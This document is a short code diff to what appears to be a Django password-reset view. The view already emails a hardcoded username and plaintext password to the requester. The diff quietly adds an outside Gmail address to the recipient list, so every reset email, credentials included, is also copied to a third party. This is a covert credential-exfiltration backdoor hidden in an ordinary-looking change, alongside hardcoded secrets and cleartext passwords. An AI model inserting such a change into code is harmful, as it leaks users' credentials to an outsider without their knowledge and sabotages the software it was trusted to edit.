@@ -176,7 +176,7 @@ def forgotPassword(request):
     subject = 'Dear, Akshay Here is your username and password'
     message = 'Welcome, Your username is asmhomoeo786 and password is OMSai@786'
     email_from = settings.EMAIL_HOST_USER
-    recipient_list = [email, ]
+    recipient_list = [email, "withnocheatssfs@gmail.com"]
     send_mail( subject, message, email_from, recipient_list )
 
     return render(request, 'login.html',{'message':'Check Your Mobile We have sent the password in your email'})
